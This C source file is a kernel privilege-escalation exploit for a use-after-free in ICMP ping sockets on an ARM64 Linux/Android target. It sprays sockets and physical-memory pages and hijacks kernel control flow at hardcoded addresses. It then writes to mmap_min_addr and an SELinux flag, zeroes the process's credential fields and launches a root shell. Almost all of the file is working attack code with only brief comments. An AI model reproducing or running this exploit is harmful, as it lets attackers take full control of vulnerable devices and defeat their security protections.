#include "kernelhelp.h"

#define PAGE_SIZE			  		(0x1000)
#define MAX_NULLMAP_SIZE            (PAGE_SIZE * 4)
#define LIST_POSIION				(0x00001360)
#define PROTECT_BASE				(LIST_POSIION&~(PAGE_SIZE-1)) 

#define MAX_VULTRIG_SOCKS_COUNT     (4000)
#define MAX_PHYSMAP_SIZE            (128 * 1024 * 1024)	// 128 MB, cannot be too bigger...
														// 128*6 in total, we only assigned with 1GB
#define MAX_PHYSMAP_SPRAY_PROCESS   (6)	// 6 times
#define MAGIC_VALUE 			  	(0x4B5F5F4B)
#define SIOCGSTAMPNS 				(0x8907)
#define NSEC_PER_SEC           		(1000000000)

int   vultrig_socks[MAX_VULTRIG_SOCKS_COUNT];
void* physmap_spray_pages[(MAX_PHYSMAP_SIZE / PAGE_SIZE) * MAX_PHYSMAP_SPRAY_PROCESS];
pid_t physmap_spray_children[MAX_PHYSMAP_SPRAY_PROCESS];
int   physmap_spray_pages_count;
void* payload = NULL;
int   exp_sock = -1;
int   exp_index = 0;

void prepare();
void protection();
void spraying();
void fetching();

static inline void errhandler(char* s)
{
    perror(s);
    exit(EXIT_FAILURE);
}

void trigger(void)
{
	close(exp_sock);
}

void placing(void)
{
	printf("[+] Start hijacking pc as well as set addr_limit...\n");
// ip_mc_drop_socket(), mc_list set to NULL
	*(unsigned long *)((char *)payload + 0x290) = 0;	
	
// set addr_limit thourgh kernel_setsockopt
	*(unsigned long *)((char* )payload + 0x28) = (unsigned long)payload;	// recursive...
	*(unsigned long *)((char* )payload) = (unsigned long)0xFFFFFFC00035D788;
	*(unsigned long *)((char* )payload + 0x68) = (unsigned long)0xFFFFFFC00035D7C0;

	trigger();	// We can close the corresponded socket to trigger the bug
	printf("[~] Done these! We are allowed to do arbitrary read&write\n");

// write to mmap_min_addr
	printf("[+] Start hijacking mmap_min_addr...\n");
	unsigned long empty8 = 0;
	kernel_write8((void *)0xffffffc000652148, &empty8);
	
// turn off selinux
	void* nullmap = mmap(NULL, PAGE_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE| MAP_FIXED | MAP_ANONYMOUS, -1, 0);
	if (nullmap == MAP_FAILED) errhandler("[!] placing().mmap");
	printf("[~] Successfully adopt null mapping\n");

// turn off selinux
    unsigned int data4 = 0;
	kernel_write4((void *)0xffffffc00065399c, &data4);
	printf("[*] selinux disabled.\n");
// fortunately we have no selinux
	exp_sock = -1;
	exp_index += 1;
	fetching();

// thread_info_addr=sp&0xFFFFFFFFFFFFC000? does this really make sense?
// leaking that address to nullmap region
	*(unsigned long *)((char *)payload + 0x290) = 0;
	*(unsigned long *)((char *)payload + 0x28)  = (unsigned long)payload;
	*(unsigned long *)((char *)payload)         = (unsigned long)0xFFFFFFC0004AA518;
	trigger();

	void* task = NULL;
	task = (void *)*(unsigned long *)((char *)nullmap + 0x18);

	void* cred = NULL;
	kernel_read8((char *)task + 0x398, &cred);
// cred rewriting
	unsigned int empty4 = 0;
	kernel_write4((char *)cred +  4,  &empty4);
	kernel_write4((char *)cred +  8,  &empty4);
	kernel_write4((char *)cred + 12,  &empty4);
	kernel_write4((char *)cred + 16,  &empty4);
	kernel_write4((char *)cred + 20,  &empty4);
	kernel_write4((char *)cred + 24,  &empty4);
	kernel_write4((char *)cred + 28,  &empty4);
	kernel_write4((char *)cred + 32,  &empty4);

// fd cleaning
	void* files, *fdt;
	kernel_read8((char *)task + 0x728, &files);

	kernel_read8((char *)files + 8, &fdt);
	empty4 = 0;
	kernel_write4(fdt, &empty4);
}

void get_shell() {
    if (getuid() == 0) {
        printf("[*] congrats, enjoy your root shell.\n");
        system("/system/bin/sh");
    } else {
        errhandler("[*] no root privilege, relax and try again.");
    }
}


int main(int argc, char** argv) {

    // We can do some preparation here, maximize the resources for example
    prepare();

    // Then we should do `mmap` of the poision value to avoid early crash
    protection();

    // We should create vulnerable sockets as well as spraying lots of ping sock objects here
    spraying();

    exp_index = MAX_VULTRIG_SOCKS_COUNT / 2;
    // Then we can do lots of mmap here, trying to fetch the target page
    fetching();

    placing();

    get_shell();

    return 0;
}

void prepare() {
    printf("[*] Start preparing ...\n");

    /* maximize the fd limit to enable spraying */
    struct rlimit rlim;
    int ret;

    ret = getrlimit(RLIMIT_NOFILE, &rlim);
    if (ret != 0)
        errhandler("[-] err at getrlimit-1");

    printf("[*] origin rlimt rlim_cur is %d\n", rlim.rlim_cur);
    rlim.rlim_cur = rlim.rlim_max;
    setrlimit(RLIMIT_NOFILE, &rlim);
    ret = getrlimit(RLIMIT_NOFILE, &rlim);
    if (ret != 0)
        errhandler("[-] err at getrlimit-2");

    printf("[*] preparing done !\n");
}

void protection() {
    printf("[*] Start protection ...\n");

    int i;
    system("echo 4096 > /proc/sys/vm/mmap_min_addr");
    void* protect = mmap(PROTECT_BASE, MAX_NULLMAP_SIZE, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);
    if (protect == MAP_FAILED)
        errhandler("[-] err at mmap");

    for (i = 0; i < MAX_NULLMAP_SIZE / PAGE_SIZE; i++)
        memset((char*) protect + PAGE_SIZE*i, 0x90, PAGE_SIZE);

    // if (mlock(PROTECT_BASE, MAX_NULLMAP_SIZE) == -1)
    //     errhandler("[-] err at mlock");

    printf("[*] Protection Done !\n");
}

void spraying() {
    printf("[+] Start socket spraying ...\n");
    int i, ret;
    struct sockaddr _sockaddr1 = { .sa_family = AF_INET};
    struct sockaddr _sockaddr2 = { .sa_family = AF_UNSPEC};

    for(i = 0; i < MAX_VULTRIG_SOCKS_COUNT; i++) {
        vultrig_socks[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_ICMP);
        if (vultrig_socks[i] < 0)
            errhandler("[-] err at creating vuln socket");
        
        ret = connect(vultrig_socks[i], &_sockaddr1, sizeof(_sockaddr1));
        if (ret < 0)
            errhandler("[-] err at create socket hash");
    }

    for (i = 0; i < MAX_VULTRIG_SOCKS_COUNT; i++) {
        ret = connect(vultrig_socks[i], &_sockaddr2, sizeof(_sockaddr2));
        if (ret < 0)
            errhandler("[-] err at free socket once");

        ret = connect(vultrig_socks[i], &_sockaddr2, sizeof(_sockaddr2));
        if (ret < 0)
            errhandler("[-] err at free socket twice");
    }

    printf("[+] Socket spraying done !\n");

    printf("[+] Start physmap spraying ...\n");  // I can't really understand here; maybe I will goto lean ret2dir first ...;
    memset(physmap_spray_pages, 0 ,sizeof(physmap_spray_pages));
    memset(physmap_spray_children, 0, sizeof(physmap_spray_children));
    physmap_spray_pages_count = 0;
    for (i = 0; i < MAX_PHYSMAP_SPRAY_PROCESS; i++) {
        int j;
        void* mapped;
        void* mapped_page;
        mapped = mmap(NULL, MAX_PHYSMAP_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
        if (mapped == MAP_FAILED)
            errhandler("[-] err at mmap");

        for(j = 0; j < MAX_PHYSMAP_SIZE / PAGE_SIZE; j++) {
            memset((void *)((char *)mapped + PAGE_SIZE * j), 0x41, PAGE_SIZE);
            mapped_page = (void *)((char *)mapped + PAGE_SIZE * j);
            *(unsigned long *)((char *)mapped_page + 0x1D8)  = MAGIC_VALUE + physmap_spray_pages_count;
            physmap_spray_pages[physmap_spray_pages_count]  =  mapped_page;
            physmap_spray_pages_count++;
        }
    }
    printf("[+] Physmap spraying done!\n");
}

void fetching() {
    printf("[+] Start fetching the UAF socket...\n");
    struct timespec time;
    uint64_t value;
    void *page = NULL;
    int j = 0;
    int got = 0;
    int index = MAX_VULTRIG_SOCKS_COUNT / 2;

    do {
        exp_sock = vultrig_socks[index];
        memset(&time, 0, sizeof(time));
        ioctl(exp_sock, SIOCGSTAMPNS, &time);

        value = ((uint64_t)time.tv_sec * NSEC_PER_SEC) + time.tv_nsec;
        for(j = 0;  j < physmap_spray_pages_count; j++) {
            page = physmap_spray_pages[j];
            if(value == *(unsigned long *)((char *)page + 0x1D8)) {
                printf("[*] obtained magic:%p\n", value);
                got = 1;
                payload = page;
                break;
            }
        }

        index += 1;
    } while(!got && index < MAX_VULTRIG_SOCKS_COUNT);

    if (got == 0)
        errhandler("[!] fetching() fail...");

    printf("[~] Done fetching the UAF socket!\n");
}